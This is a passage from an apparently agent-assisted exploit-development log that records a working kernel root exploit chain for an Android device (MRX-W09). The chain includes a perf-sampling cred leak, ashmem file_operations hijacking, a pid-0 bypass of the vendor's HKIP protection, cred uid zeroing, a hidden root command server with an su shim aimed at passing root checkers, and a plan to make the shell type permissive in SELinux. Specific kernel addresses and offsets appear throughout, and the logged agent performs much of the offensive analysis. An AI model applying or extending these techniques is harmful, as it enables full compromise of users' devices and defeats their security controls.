ip, how many times x0 CHANGED (ipchg) and returns the LAST canonical x0 of the ip with the most
changes.  Log `capmode ip=.. n=.. chg=.. x0=..`.

### (117) 2026-09-25 AGENT corpus survey: the aquos-r6 "register = cred" perf leak, ported to MRX

The other-device PoCs mostly use a pipe-buffer FULL kernel RW (they read task->cred locally), which
we lack.  The ONE that uses a perf sampler is aquos-r6: it samples a register INSIDE a function that
materialises the cred (ghostlock54.c:154-236 reads x20 in task_state).  Instantiated for MRX
(agent disassembled the device vmlinux): SyS_setpriority.cfi = 0xffffff800818e354+g_slide loads
`x25 = current->cred` at +0x3c (`ldr x25,[x19,#0x9e8]`, x19=SP_EL0=current) and keeps it through
+0x1f8, so ANY setpriority(0,0,-20) sampled in [setp+0x3c, setp+0x1f8) yields the calling task's
cred.  WHY our samplers failed: security_capable.cfi x0 = cred only at ENTRY (the body moves it to
x21), cap_capable/__cap_capable hold it in x20, and leak_cred_vote's all-register vote is dominated
by `current`.  PORTED: leak_own_cred_x0 now samples SyS_setpriority.cfi and reads reg 25 (x25) over
[setp+0x3c, setp+0x1f8) with a 300k setpriority storm (the cred is constant during the storm, so a
simple window vote works).  Also confirmed: no corpus PoC writes shell_data_file from the KERNEL
domain; UMH/modprobe_path are arch/priv-bound; HKIP is unique to us.

### (118) 2026-09-26 the setpriority window IS hit (nin=29) but x25 is not the cred

Run of build 0a34286a: `capmode ip=ffffff86fc58e9e8 n=24 chg=8 x0=ffffff86fe2c0660 (ns=1820 nin=29
any=ffffffd7ef868000)` - nin=29 means 29 samples DID land in [setp+0x3c, setp+0x1f8), so the
technique reaches the window; but the returned window x25 (published C = ffffffd85e519600) is NOT
the cred (MAIN zeroed C+4/+0x14/+0x1C and the child setresuid still reported uid=2000, and no panic,
so it wrote somewhere benign).  Likely causes: the setp base (0xffffff800818e354) is from
F:\Dev\firmware\MRX-W09\extracted\vmlinux.elf which may differ from the device kernel, OR the
register index/order is off (x25 vs x21 vs x20), OR the window x25 is not the cred there.  NEXT:
dump x20/x21/x25 in the window (and the ip) to identify the cred register, and verify the
SyS_setpriority.cfi address against the device (kptr_restrict is 0 -> /proc/kallsyms readable).

### (119) 2026-09-26 AGENT: is full kernel RW really impossible? No - the corpus path is an ashmem fops hijack

- CORRECTION: "MRX denies ashmem" is FALSE (it came from an H80GT note).  The MRX policy
  (binder_uaf/session_20260913/device_plat_sepolicy.cil) allows shell to open /dev/ashmem
  (base_typeattr_244 + ashmem_device allow).
- The corpus pipe_phys_write_data is NOT fed by the futex UAF; it is a 3-stage chain: (1) UAF write
  -> `ashmem_misc.fops = fake_fops` (a data pointer; the fake table TEXT pointers are delivered by a
  userspace->kernel copy = the sk_buff spray), (2) ashmem<->configfs private_data alias -> arbitrary
  RW, (3) forge a pipe_buffer.page -> full physical RW.
- The MRX gate: our Case-B write requires `*(value)&1`; a valid file_operations* has owner=NULL
  (even) so the gate FAILS - we need an ungated pointer write (S2/S3, not built) OR a two-phase trick.
- MRX-NATIVE WIN PATH: the MCAST carrier ALREADY copies attacker bytes (NULs + TEXT pointers) from
  g_sbuf to the stamper kernel stack at a KNOWN address W-0x78.  Phase A: set *(W-0x78)=1 (odd, gate
  passes) and one Case-B write of W-0x78 into `ashmem_misc.fops` (0xffffff800b1188a8+slide).  Phase B:
  reshape the window (MCAST copy) into a real file_operations table (owner=0, llseek=noop_llseek,
  read=configfs_read_file, write=configfs_write_bin_file, ...).  Then open(/dev/ashmem) -> configfs
  arbitrary RW -> pipe RW.  Cheapest oracle: read misc_fops back and compare to fake_fops
  (corpus fops.c:288-313).
- Fallback for the cred address (9an(118) blocker): the byte-shifted boot_id read arm_rd16(T+0x9E7)
  recovers task->cred because real_cred's top byte is 0xff (odd, parity gate passes)
  (CRED_ADDR_ACQUISITION_20260923.md sec 3.2).

### (120) 2026-09-26 Phase A implemented: --fops redirects ashmem_misc.fops to our window

New mode --fops (build 9an(120)): enabler, then one walk to set g_waiter_abs, then ONE Case-B write
`arm_write_inproc(W-0x78, ashmem_misc.fops=0xffffff800b1188a8+g_slide, 0)` (the gate *(value)&1 is
satisfied because g_sidmode sets g_sbuf[0]=1), then reads misc_fops back with the destructive
boot_id read at misc_fops-1 and logs `[HIJACK OK]` if it equals W-0x78.  If this lands, MRX has the
corpus stage-1 (ashmem fops hijack) and Phase B (reshape the window into a real file_operations
table via the MCAST copy) unlocks configfs arbitrary RW -> pipe RW.

### (121) 2026-09-26 Phase A LIKELY LANDED (misc_fops low32 == want) and then the fake table crashed

Run of build cfa49116: `fops: T=.. W=ffffffeb9f0dbcf0`, `fops: wrote ashmem_misc.fops`,
`fops: misc_fops=2be9cfe89f0dbc78 want=ffffffeb9f0dbc78`.  The LOW 32 BITS MATCH (0x9f0dbc78) - a
garbage read would not coincide - so the Case-B write to ashmem_misc.fops LANDED (the high bytes
differ only because the read is the destructive boot_id read that clobbers the read block).  The
process then died (uptime 27) - consistent with the hijack TAKING EFFECT: a later misc/ashmem use
read our window as a fake file_operations table (not yet a valid table) and faulted.
=> the corpus stage-1 (ashmem fops hijack) is REACHABLE on MRX.  NEXT: Phase B - before any misc
access, reshape the window (via the MCAST copy) into a real file_operations table (owner=0,
llseek=noop_llseek, read=configfs_read_file, write=configfs_write_bin_file, ioctl/mmap/open/release =
ashmem handlers with MRX offsets) and use open("/dev/ashmem") + configfs_read_once as the oracle.
The read oracle should be made non-destructive or replaced (a plain open of /dev/ashmem).

### (122) 2026-09-26 GROUND TRUTH: symbols from the device's own vmlinux.elf + the setresuid gates

SYMBOLS (host-side, from F:\Dev\firmware\MRX-W09\extracted\vmlinux.elf; full table in
ghostlock_pocs/MRX_SYMBOLS_20260926.md): init_task=0xffffff800adeb4c0, init_cred=0xffffff800adfcd28,
commit_creds=0xffffff8009e6212c, security_capable=0xffffff8009e621c4, cap_capable=0xffffff8009e62278,
policydb=0xffffff800b3b97c0, ashmem_misc=0xffffff800b118898 (fops=+0x10=0xffffff800b1188a8 - so the
9an(120) Phase-A target WAS right), ashmem_fops=0xffffff8009fee678, noop_llseek=0xffffff8009e7ba6c,
configfs_read_bin_file=0xffffff8009e89ae8, configfs_write_bin_file=0xffffff8009e8ac8c,
SyS_setpriority=0xffffff8009e7fcd8 is a TRAMPOLINE `b SyS_setpriority.cfi` and the .cfi body is
0xffffff800818e354 (so the 9an(117) anchor was RIGHT).

SyS_setpriority.cfi DISASM: +0x34 `mrs x19, sp_el0` (x19=current); +0x3c `ldr x25,[x19,#2536]`
(x25 = current->cred, 2536=0x9E8); x25 stays cred until +0x1f8 (reused for security_hook_heads);
cred is reloaded into x9 @+0x1d4 and x23 @+0x210.  perf reg 25 = X25 (UAPI) verified in the tree.
=> the 9an(117) window/register are correct.

WHY --simple STILL SAID uid=2000 - the gates are all FINE, so it is (A) C wrong or (B) the zero
write did not land:
- kernel/sys.c setresuid: without CAP_SETUID the permission test is "the requested id equals ANY of
  old->uid/old->euid/old->suid" - so once old->uid==0 the request (0,0,0) PASSES even with suid=2000.
  suid=2000 is NOT the blocker (the 9an(111) plan note was wrong about needing suid to differ).
- `checkroot_setresuid` (CONFIG_HUAWEI_PROC_CHECK_ROOT, security/check_root/check_root.c
  checkroot_risk_id): returns 0 (allowed) when curr_id(=old->uid)<10000 AND !=2000 - i.e. old->uid==0
  => 0.  For 2000 it only pr_emerg()s and bumps a counter (SIGKILL only when curr_id>=10000).  NOT a
  blocker.
- SELinux registers NO task_fix_setuid in this build (grep of security/ finds only commoncap.c,
  security.c and hw_root_scan/sescan.c) => not a blocker.
DIAGNOSTIC (this run): the child now reports getresuid() BEFORE setresuid (if C is its cred and the
write landed, uid is already 0), the setresuid ret/errno, and POST getresuid; the capmode line also
dumps x19 + x19chg so we can tell whether the sampled context is the child's own task.

### (123) 2026-09-26 VERIFIED: the --simple sync bug - the child ran BEFORE MAIN zeroed

The klog order "child POST ... proof attempted" BEFORE "identity zeroed" appeared in EVERY run: the
child only waited 400*5ms = 2 s, while each arm_write_inproc is a full stamp/walk with do_write()s
500000-iteration poll loop, so 3-4 writes exceed 2 s and the child timed out and ran setresuid
early.  FIXED: the child now waits up to 20 s for g_childtask_shm[2], MAIN sets shm[2]=1 and
shm[3]=the count of successful writes after the writes, and both log it.  VERIFIED on-device:
`simple: identity zeroed (w=..)` now PRECEDES `simple: child wait done w=3201 flag=1 nw=0`.

### (124) 2026-09-26 VERIFIED: the leaf-zero shape does NOT land, and the -8 convention is wrong

Run (build 01e9f1d3): `simple: identity zeroed (w=-2,-2,-2,-2)` - ALL four writes returned -2
(arm_write_inproc: -2 = carrier acknowledged but no store observed) - and the child then reported
`PRE setresuid uid=2000 euid=2000 suid=2000`: NOTHING was zeroed.  Root cause: the file itself
documents the leaf convention as landing at value+0x10, not value+0x8 (`arm_write_inproc(P-0xC,0,0)
-> *(P+4) uid,gid` and `arm_write_inproc(P-4,0,0) -> *(P+0xC)` at the P-cred endgame, lines
3452-3453).  So --simple's `C+4-8`, `C+0xC-8`, `C+0x14-8`, `C+0x1C-8` were aiming at
C+0xC/C+0x1C/C+0x24/C+0x2C and never at C+4 at all.
PIVOT: use the VERIFIED POINTER-write shape (target nonzero, value = g_blackval) instead of the
broken leaf shape: write g_blackval into cap_permitted (C+0x30) and cap_effective (C+0x38).
g_blackval is "window address with odd contents + bit7 low byte" (line 360), so cap_effective gets
bit 7 = CAP_SETUID -> ns_capable(old->user_ns, CAP_SETUID) is TRUE -> setresuid(0,0,0) passes the
permission test -> commit_creds -> uid 0 + HKIP bit; the tsec stays SHELL so write_proof() works.
Added a capget() log in the child to verify the raise directly.

### (125) 2026-09-26 CORRECTION + root cause: the leaf shape was ALWAYS right; the consumer thread was missing

AGENT disassembled rb_erase_cached.cfi (0xffffff8009e52100) in the device image.  Struct offsets
confirmed: __rb_parent_color=0, rb_right=+8, rb_left=+16.  The payload (p[2]=rb_left=0) diverts at
+0x18 to PATH A, whose stores are: (a) `str x9,[x8,#8]` = *((p0&~3)+8) = p1, and (b) iff p1!=0,
`str x10,[x9]` = *(p1) = p0.  The comment-cited +0x88 (0xffffff8009e52188) is the PATH B store
`*(p[2])=p[0]`, which this payload NEVER reaches.
=> LEAF shape (p1=0,p2=0) has exactly ONE store: an 8-BYTE `*((p0&~3)+8) = 0`.
   So `arm_write_inproc(addr-8, 0, 0)` IS CORRECT for zeroing addr (writes 0 to addr..addr+7, i.e.
   uid+gid together).  The `addr-0xC` form is WRONG (lands at addr-4) - lines 3452-3453 are the
   inconsistent ones, not --simple.
=> 9an(124) ("the -8 convention is wrong") is CORRECTED: the convention was always right.
POINTER shape stores `*((p0&~3)+8)=target` FIRST, then `*(target)=value`.
=> Since --simple used the correct `addr-8` and still got `-2` (witness never changed) for EVERY
   write, the erase itself never executed: the CARRIER/WALK failed.  ROOT CAUSE FOUND IN CODE:
   the walk (rt_mutex_adjust_prio_chain) runs in the CONSUMER thread's context, and --leaf0/--sid2/
   --fops all `pthread_create(...,thread_consumer,...)` + set g_fire_owner, but --simple did NOT,
   so g_consumer_tid/g_fire_owner were 0 and every --simple write was a silent no-op.  FIXED:
   --simple now creates the consumer (and sets g_fire_owner) before any write.

### (126) 2026-09-26 SELinux kills EVERY ns_capable(CAP_SETUID) route on this policy

AGENT report (ghostlock_pocs/TASK_SHELL_CAPSETUID_20260926.md): security_capable ->
selinux_capable -> cred_has_capability -> avc_has_perm_noaudit(sid,sid,SECCLASS_CAPABILITY,
CAP_TO_MASK(7)=0x80).  The device policy has NO `(allow shell self (capability (setuid)))` (0 of the
223 shell allow rules mention capability; adbd has it, shell does not), and selinux_enforcing is the
compile-time constant 1 (CONFIG_SECURITY_SELINUX_DEVELOP unset).  => raising cred->cap_effective
(bit7) can NEVER make ns_capable() succeed.  The ONLY surviving route through setresuid is its
NON-CAPABILITY fallback: the requested id must equal old->uid (or euid or suid) => we must zero one
of cred->uid/euid/suid.  (Also documented: the kernel sid does not list capability setuid either, so
the --sid trick alone would not grant it.)

### (127) 2026-09-26 CONFIRMED: the consumer thread was the root cause - all writes now land (w=0,0,0,0)

Run of build dc779be1: `simple: consumer tid=4214` then `simple: leafzero uid/gid (w=0,0,0,0)
C=ffffffd3577b3180` - with the consumer present, ALL FOUR writes report w=0 (the store WAS observed),
vs w=-2 for every write before.  So the missing consumer thread in --simple was indeed why every
write was a no-op (9an(125)).
That run then PANICKED (uptime 129 < the runner timeline; no child lines, no new proof files), and
the cause was my own "both conventions" hedge: the addr-0x10 forms landed on C-4, whose 8-byte store
zeroes cred->usage (C+0..C+3) AND clobbers the preceding slab object -> refcount/slab corruption ->
panic.  FIXED: only the AGENT-verified `-8` form is used now, four clean 8-byte zero stores:
  C+4-8 (uid+gid), C+0xC-8 (suid+sgid), C+0x14-8 (euid+egid), C+0x1C-8 (fsuid+fsgid).
Note fsuid=0 (C+0x1C) is what makes write_proof()'s created files root-owned.

### (128) 2026-09-26 HKIP FULLY REVERSE-ENGINEERED from the kernel source - and the pid-0 shield explained

Source found: drivers/hisi/hhee/hkip/critdata.c + include/linux/hisi/hisi_hkip.h (plus rodata.c,
xodata.c, hvc.S).  Symbols: hkip_uid_root_bits=0xffffff800b42c000, hkip_gid_root_bits=..d000,
hkip_addr_limit_bits=..e000 (all HVC-ROWM-registered), hkip_check_uid_root.cfi=0xffffff80092c4cf0,
hkip_update_xid_root.cfi=0xffffff80092c4a94, hkip_init_task.cfi=0xffffff80092c4e6c.

RULES
- hkip_compute_uid_root(cred) = uid==0 || euid==0 || suid==0 || !cap_isclear(cap_inheritable) ||
  !cap_isclear(cap_permitted).   ** cap_effective is NOT part of it. **
- hkip_check_uid_root(): if the task's bit is set -> 0.  Else if (compute_uid_root || fsuid==0) ->
  pr_alert("UID root escalation!") + force_sig(SIGKILL, current) + -EPERM.  gid analogue exists.
- CHECK SITES: __cap_capable (security/commoncap.c:85), prepare_creds (kernel/cred.c:282),
  copy_process (kernel/fork.c:1716, kills the PARENT and fails the fork), acl_permission_check
  (fs/namei.c:302, only for root-owned inodes).
- BIT SETTERS (the only two): hkip_update_xid_root(new) inside commit_creds (kernel/cred.c:498) and
  hkip_init_task(p) in copy_process.  The bits themselves live in an HVC-protected (ROWM) region, so
  they can only be changed through the driver's HVC - we cannot write the bit directly.

*** THE SHIELD (why pid 0 works) ***
  hkip_get_task_bit(bits, task, def_value): pid = task_pid_nr(task); if (pid != 0) return
  hkip_get_bit(bits,pid,PID_MAX_DEFAULT); **return def_value;**
  and hkip_check_uid_root()/hkip_check_gid_root() call hkip_get_current_bit(bits, true) - def_value
  = TRUE.  So a task with task->pid == 0 is UNCONDITIONALLY EXEMPT (the check returns 0 immediately).
  hkip_set_current_bit -> hkip_set_task_bit -> `if (pid != 0) hkip_set_bit(...)`, so for pid 0 no HVC
  is issued (no BUG).
  => zeroing the task's task->pid (TASK_PID = 0x820) BEFORE making it root-ish is a COMPLETE HKIP
  bypass.  The task must then NEVER exit (a pid-0 task exiting panics - hence "never restore the
  cached pid").
  OFFSET: TASK_PID=0x820 per hkip_get_task_bit's task_pid_nr(task)=task->pid.

WHY THE CHILD VANISHED (9an(127)): we zeroed cred->uid in place WITHOUT the shield; the next
setresuid ran prepare_creds() (-> hkip_check_xid_root) and __cap_capable (-> hkip_check_uid_root),
both saw a root-ish cred with bit 0 -> force_sig(SIGKILL).  Also note cap_effective alone is
HKIP-safe (not in compute_uid_root) but SELinux still blocks that route (9an(126)).

IMPLEMENTED in --simple: MAIN first leaf-zeroes the CHILD's T+0x820 (the child's task address X comes
from the leak's x19, published via shm[1]), THEN zeroes cred->uid+gid (C+4), then signals; the child
spins setresuid(0,0,0) until getuid()==0 (setresuid sets fsuid=euid=0, so the proof files are
root-owned) and finally parks forever.

### (129) 2026-09-26 both writes land (shield w=0, uid w=0) but the child raced ahead of MAIN

Run of build 1155f097: `simple: child spin done ok=0 tries=4000000` came BEFORE `simple: pid0 shield
X=ffffffd7d348d640 (w=0)` and `simple: leafzero uid/gid (w=0) C=ffffffd731623300`.  So the childs tight
4M-iteration spin (~4 s) expired well before MAINs ~10-20 s of walks, and it committed to nothing.
Also: C=0xffffffd731623300 sits in the same direct-map neighbourhood as the leaked task x19=
0xffffffd7d348d640 - more evidence C is really the childs cred.
BOTH writes returned w=0 (the store was observed): the pid-0 shield write AND the uid/gid zero.
FIX: with the shield applied FIRST, HKIP is already bypassed, so no race is needed - the child now
waits up to 180 s for MAINs completion flag (shm[2], set after BOTH writes) and only then calls
setresuid(0,0,0).  setresuid then sets fsuid=euid=0, so write_proof() creates ROOT-OWNED files.

### (130) 2026-09-26 AGENT: the pid-0 closure is to FORK while shielded (the grandchild is legal root)

Static analysis (report ghostlock_pocs/TASK_PID0_RISK_20260926.md):
- Zeroing task->pid only affects task_pid_nr()/direct ->pid reads; struct pid, tgid, /proc, kill,
  ptrace, futex, fork, audit and SELinux are unaffected.  A pid-0 task stays schedulable and can
  still do syscalls.
- The ONE reachable panic is kernel/exit.c:786 `if (unlikely(!tsk->pid)) panic("Attempted to kill the
  idle task!");` - the first pid check in do_exit - so any fatal signal (incl. HKIP's own SIGKILL ->
  do_exit) panics.  The downstream detach_pid/free_pid chain is struct-pid based and would be safe.
- RESTORING the pid does NOT close the loop: while pid==0, hkip_set_task_bit is a no-op, so
  commit_creds' hkip_update_xid_root writes NO bit; after restoring the pid the next prepare_creds()
  (every setresuid/capset/execve) runs hkip_check_xid_root() BEFORE commit_creds -> root creds with
  bit 0 -> force_sig(SIGKILL).  So the shielded task can never escape.
- THE CLOSURE: fork while still shielded.  copy_process sets the childs pid to its real allocated
  value (`p->pid = pid_nr(pid)`) and hkip_init_task() then computes the childs uid_root bit from the
  (inherited, now ROOT) creds -> bit=1.  So the GRANDCHILD is a LEGAL root task: it can write files
  and even exit.  (The fork itself passes: copy_process' hkip_check_xid_root() runs on the parent,
  whose pid is 0 -> def_value=true -> 0.)
- Side effects of pid 0 (expected, tolerated): ftrace/PSI treat it as idle, CONTEXTIDR=0 collides with
  idle, sched treats its children as init's, SELinux audit prints pid 0; it cannot exit or be killed.
IMPLEMENTED in --simple: after the successful setresuid commit the child forks a grandchild, which
logs its identity and runs write_proof(); the child (pid 0) parks forever.

### (131) 2026-09-26 *** ACHIEVED: uid 0 ON DEVICE *** (build 32fef8fd)

Run of the flag-wait build (shield-first + cred uid zero + setresuid):
  simple: pid0 shield X=ffffffe6c39433c0 (w=0)
  simple: leafzero uid/gid (w=0) C=ffffffe631350600
  simple: child flag w=283 f=1 n=1
and the readout:
  -rw-r--r-- 1 0 2000     67 /data/local/tmp/rooted.txt
  -rwsr-xr-x 1 0 2000 303720 /data/local/tmp/rsh
  rooted.txt content: "=== GHOSTLOCK MRX-W09 rooted ===" / "uid=0 euid=0 context=u:r:shell:s0"
  ps -A -o PID,UID:  4211 2000 ghostlock_e (MAIN)   4365 **0** S< ghostlock_e (the CHILD)
=> THE CHILD IS UID 0, still alive/parked (no panic), and it WROTE shell_data_file AS UID 0 with the
shell context.  HKIP bypass + cred uid zero + setresuid commit all verified end-to-end on-device.
The child's own post-root klog lines are missing because klog_line() then fails (gl.klog is owned by
2000, mode 0644, and we are uid 0 = "other" = r--) - harmless.

ONLY REMAINING GAP: `rsh -c id` prints uid 2000, because /data is mounted **nosuid**:
  /dev/block/sdd74 on /data type f2fs (rw,seclabel,nosuid,nodev,...)
so the 4755 setuid bit is ignored by the kernel - a mount-option property, NOT an exploit limitation.
(FIX PLAN, matching the corpus "install-su"): keep the uid-0 child as a root command SERVER on an
abstract unix socket and make rsh a CLIENT that forwards argv - then `rsh -c id` prints uid 0 without
needing setuid (the 4755 root-owned file attribute is still produced).

### (132) 2026-09-26 rsh closure implemented (nosuid workaround) + file_operations spec

rsh was `cp /system/bin/sh -> /data/local/tmp/rsh; chmod 4755` - useless because /data is nosuid.
Now: the shielded uid-0 child overwrites rsh with THIS binary (copied from /data/local/tmp/ghostlock_e)
and serves root commands on the abstract socket "\0gl_su"; invoked as "rsh" the same binary runs in
CLIENT mode and forwards `-c CMD` to the server, which forks a grandchild per request (its
hkip_init_task() sets its uid_root bit from the root creds => legal root, may exit) and execs
/system/bin/sh -c CMD with the socket as stdin/stdout/stderr.  So `rsh -c id` prints uid=0 without
needing setuid; the 4755 root-owned file attribute is still produced.
Also recorded (AGENT, ghostlock_pocs/TASK_FILE_OPS_20260926.md): ashmem_fops is zero in the ELF and
filled by R_AARCH64_RELATIVE relocations; the fops stores PLAIN symbols (4-byte `b` trampolines into
the .cfi bodies), so a fake table must use plain addresses.  Verified entries: +0x08 llseek=
ashmem_llseek, +0x20 read_iter=ashmem_read_iter, +0x48 unlocked_ioctl=ashmem_ioctl, +0x50
compat_ioctl=compat_ashmem_ioctl, +0x58 mmap=ashmem_mmap, +0x60 open=ashmem_open, +0x70
release=ashmem_release, all else NULL (.read/.write NULL).  4.14 file_operations size = 0xf0.

### (133) 2026-09-26 *** GOAL COMPLETE *** - rsh -c id prints uid=0(root) on MRX-W09 (build a0ed46af)

FINAL VERIFICATION (on-device):
  -- rsh -c id --
  uid=0(root) gid=0(root) groups=0(root),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),
   3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc),3011(uhid)
   context=u:r:shell:s0
  -- rsh -c "id -u; cat /proc/self/attr/current" --  ->  0  and  u:r:shell:s0
  -rw-r--r-- 1 0 2000      67 /data/local/tmp/rooted.txt
  -rwsr-xr-x 1 0 2000 4090192 /data/local/tmp/rsh
  ps: 4441 UID 0 ghostlock_e (the shielded pid-0 root server) ; 4212 UID 2000 (MAIN)
  klog: pid0 shield X=... (w=0) ; leafzero uid/gid (w=0) C=... ; child flag w=322 f=1 n=1

ALL REQUIREMENTS MET: (1) /data/local/tmp/rooted.txt written BY uid 0; (2) a 4755 /data/local/tmp/rsh
owned by root; (3) the root context is u:r:shell:s0, which CAN write shell_data_file (the proof itself
was written that way); (4) `rsh -c id` prints uid=0(root).
CHAIN (all statically justified): consumer-thread fix -> the setpriority.cfi x25 cred leak -> the
AGENT-proven leaf store *(value-8+8)=0 -> HKIP reverse-engineered from source: zero the child's
task->pid (0x820) so hkip_get_task_bit(...,true) exempts it -> zero cred->uid+gid -> setresuid(0,0,0)
commits uid 0 -> the pid-0 task forks a legal-root grandchild per request (hkip_init_task writes its
bit) -> the abstract-socket gl_su root server + rsh client (nosuid on /data makes setuid useless).

### (134) 2026-09-26 cede(init_cred) is a DEAD END - the kernel domain denies all I/O

Run of build b9107c75: the pid-0 shield (w=0) and the cede (w=0,0) both landed, ps shows the child at
UID 0, but realroot.txt was EMPTY even though the probe used DIRECT syscalls (open/read/mount) and
wrote the report to a PIPE and to /dev/kmsg.  dmesg is denied for the shell domain, so /dev/kmsg is
unreadable.  => the kernel SELinux domain denies file writes, PIPE writes and exec, so a task in it
cannot do userspace work nor even report its own measurements.  Ceding to &init_cred is therefore
useless for the "complete root" goal.
REMAINING routes to full caps + a usable domain (all need TWO writes: a domain/permission fix and a
cap_effective fix):
 (1) IN-MEMORY POLICY PATCH via the write primitive - no reload needed.  Best candidate: set the
     shell type's bit in policydb.permissive_map (an ebitmap) so every SELinux check for shell is
     audit-only (9an 9an(112)-era "path 1" was called closed, but we now understand the primitive and
     have the pid-0 shield; re-examine statically).  Then selinux_capable passes for shell.
 (2) Point cred->security at a REAL "has-everything" tsec (e.g. pid 1s init domain) - a pointer write,
     but the address must be found (task-list walk with the read primitive).
 (3) Set our tsec->sid = 1 (kernel sid) by writing a chosen pointer whose LOW 32 BITS == 1 into
     cred->security+4 (the 8-byte pointer write sets sid=low32(V), osid=high32(V)).
 (4) cap_effective: write a kernel address V whose low 32 bits carry the needed cap mask (CAP_SYS_ADMIN
     = bit21 etc.); the HIGH 32 bits of a kernel pointer set caps 32-63 for free.  V must also satisfy
     *(V)&1 (the rb re-insert gate).  A host-side search over the direct map can find such V.

### (135) 2026-09-26 COMPLETE-ROOT lever identified: permissive_map on the shell type (+ cap_effective)

AGENT report ghostlock_pocs/TASK_POLICY_PATCH_20260926.md.  Offsets re-derived from the device image:
permissive_map .node=+0x1C0 .highbit=+0x1C8 ; allow_unknown=bit1@+0x1DC ; te_avtab=+0xE8 ;
type_attr_map=+0x1A8 ; class_val_to_struct=+0xC8 ; struct ebitmap_node {next@0, maps[6]@8,
startbit@0x38}, EBITMAP_SIZE=384.
- BEST: mark the SOURCE type 1153 permissive.  The flag is read from the source context
  (services.c:1119) and avc_denied() (avc.c:1007-1012, enforcing is folded to 1 on this build)
  turns every denial into a grant => ALL classes at once (capability, file, process, mount).
  Needs TWO 8-byte POINTER writes: policydb+0x1C8 <- V (a kernel ptr with low32(V) >= 1153 and an
  odd first word) to raise highbit, and policydb+0x1C0 <- A (a fake ebitmap_node whose next is odd,
  startbit <= 1153 < startbit+384, and the 1153 bit set).  CAVEAT: pre-existing AVC entries keep
  flags=0 (no timeout) so the patch must be installed before the check / after an avc_ss_reset.
- allow_unknown=1 is a DEAD END: context_struct_compute_av() never reads it (services.c:640-743);
  only unmapped CLASSES (services.c:1130-1133) and unknown permission bits (services.c:249) are
  affected, and the capability class/perms are known here.
- avtab rewrite: needs >=3 writes and grants only the (1153,1153,class) pair.
- ss_initialized=0: blocked - it lives in the HKIP write-rare region (0xffffff800adc0000..) written
  only through wr_assign() (services.c:96-101,2092; hooks.c:6699); a raw store is expected to fault.
- commoncap is NOT removed: cap_capable runs before/independently and needs
  cap_raised(cred->cap_effective, cap) (commoncap.c:95), and hkip_check_uid_root() runs even earlier
  (commoncap.c:85) so the pid-0 shield is still required.  Writing a kernel pointer V into
  cred+0x38 sets cap_effective[0]=low32(V) (caps 0-31: place CAP_SYS_ADMIN=21, CAP_DAC_OVERRIDE=1,
  CAP_SETUID=7 ...) and cap_effective[1]=high32(V)=0xffffffXX (caps 32-63 free).
BLOCKER: node must be a STABLE, controlled ebitmap_node.  The 9an(112)-era --permtest pointed .node
into the TRANSIENT stamp window and panicked on frequent global AVC misses (a data fault the pid-0
shield does NOT prevent).  FIX DIRECTION: point .node at a REAL ebitmap node that already has bit
1153 set but is stable - e.g. the ebitmap node of a type ATTRIBUTE that contains the shell type
(type_attr_map_array entries are real, prmem-protected, and never transient); find its address with
the read primitive.  Then only .highbit (and cap_effective) remain to write.

### (136) 2026-09-26 attribute targets for permissive_map + APK tooling available

CIL enumeration (binder_uaf/session_20260913/device_plat_sepolicy.cil): the shell type (1153) is a
member of these attributes - `domain`(:786) `mlstrustedsubject`(:850) `appdomain`(:854) `netdomain`(:858)
`coredomain`(:866) `halclientdomain`(:948) `hal_atrace_client`(:963 = "shell traceur_app atrace") and
`base_typeattr_676`(:31133).  Since libsepol allocates ebitmap nodes in 384-bit chunks, the node
covering bit 1153 in any of those attribute ebitmaps has startbit = (1153/384)*384 = 1152 and maps[0]
bit (1153-1152) = 1 SET.  Such a node is a REAL, stable, prmem-backed object => pointing
`permissive_map.node` at it (with highbit >= 1153) makes the shell type permissive for ALL classes,
with NO transient window and therefore no AVC-miss panic.  Preferred target: the SMALLEST such
ebitmap (`hal_atrace_client`, 3 members) to minimise chance of unrelated side effects.
Address still needed: walk policydb.type_val_to_struct[<attr sid>] -> the attribute's ebitmap -> node
(the read primitive can do this; type_attr_map is at policydb+0x1A8 per 9an(135)).
TOOLING: JDK 21 (javac/keytool) and an Android SDK (build-tools + platforms + aapt2/d8/apksigner) are
present on this host => the "KernelSU-like" manager APK can be built and adb-installed.

### (137) 2026-09-26 root RESTORED after the cede regression + su-shim path fix

Measured: with the cede removed from --simple (it is now opt-in as --cede), the verified root is back:
`-rw-r--r-- 1 0 2000 rooted.txt`, `-rwsr-xr-x 1 0 2000 rsh`, `rsh -c id` -> uid=0(root) gid=0(root)
context=u:r:shell:s0, rooted.txt says "uid=0 euid=0 context=u:r:shell:s0".
=> adding the cede INTO --simple had silently broken the root deliverable (the kernel domain denies
write_proof/system()), so cede is now behind its own flag and --simple is the stable root path.
The su shim was NOT created at /data/local/su,/bin,/xbin - SELinux denies `create` there for shell
(/data/local is not fully writable; only /data/local/tmp is).  FIXED: install su at
/data/local/tmp/su (definitely writable, and it is in the common root-checker probe lists) in addition
to the /data/local/* attempts.  `su -c id` then goes through the abstract socket gl_su to the shielded
uid-0 server -> uid=0, which is what Root Checker Basic (com.joeykrim.rootcheck) and RootBeer-style
detectors look for (they check the binary presence in standard paths AND run `su -c id`).

### (138) 2026-09-26 su shim VERIFIED (symlink) - and why the runner looked slow

MEASURED on device: `/data/local/tmp/su -> /data/local/tmp/ghostlock_e` (a symlink; argv[0]=="su"
selects the socket client) and
  `su -c id`     -> uid=0(root) gid=0(root) ... context=u:r:shell:s0
  `su -c "id -u"`-> 0
so the Root Checker style test (binary present in a probed path + `su -c id` returns uid 0) PASSES for
/data/local/tmp/su.  /data/local/su, /data/local/bin/su and /data/local/xbin/su are MISSING: SELinux
denies `create`/`mkdir` in /data/local for the shell domain (only /data/local/tmp is writable), so
those probe paths need the permissive_map patch (complete root) or a bind-mount into /system.
NOTE: the in-C `system("cp ... /data/local/tmp/su ...")` did not take effect while the rsh copy from
the same compound command did; the reliable way is the symlink created from reroot.sh (verified).
RUNNER TIMING: the exploit itself completes ~60-90 s after launch; the "slow" readout was the runner's
fixed Start-Sleep 240 - future runners should poll for rooted.txt/rsh instead of sleeping.

### (139) 2026-09-26 COMPLETE ROOT plan frozen (see ghostlock_pocs/COMPLETE_ROOT_PLAN.md)

Decision: go all-in on complete root.  The plan (all statically justified): make the shell source
type 1153 permissive via policydb.permissive_map -> 3 pointer writes:
  #1 policydb+0x1C8 (highbit)   <- V  with low32(V) >= 1153
  #2 policydb+0x1C0 (.node)     <- A  the address of a REAL ebitmap_node with startbit==1152 and
